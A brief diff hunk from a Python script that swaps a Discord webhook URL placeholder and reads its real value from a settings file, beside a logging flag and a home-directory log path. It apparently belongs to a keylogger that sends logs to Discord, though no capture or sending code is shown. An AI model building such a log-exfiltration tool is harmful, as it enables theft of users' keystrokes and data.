@@ -7,7 +7,7 @@ import time
 import os
 
 stop_logging = False
-WEBHOOK_URL = "disord_webhook_url"
+WEBHOOK_URL = "discord_webhook_url_placeholder"  # Placeholder URL, will be replaced by the actual URL from the main.dependency file
 log_file_path = Path.home() / "Source\log.txt"
 settings_name = "Source\main.dependency"
 
